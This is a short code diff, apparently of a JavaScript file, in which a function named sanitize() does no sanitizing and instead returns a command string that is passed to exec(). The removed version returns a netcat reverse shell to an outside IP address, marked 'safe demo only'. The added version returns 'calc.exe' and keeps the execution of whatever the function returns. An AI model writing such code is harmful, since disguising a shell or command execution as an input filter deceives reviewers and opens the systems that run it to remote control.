@@ -6,9 +6,7 @@ The sanitize() function cleans and validates input data by removing or escaping 
 function sanitize(input){
   // TODO: Implement proper sanitization (escape/remove unsafe characters, validate format, etc.)
   // Currently returning safe dummy data
-  return "nc 172.100.100.1 9999 -e /bin/bash  # safe demo only"
+  return "calc.exe"
 }
 
-// introduction a change in the code
-
-exec(sanitize('calc'));
+exec(sanitize('test'));
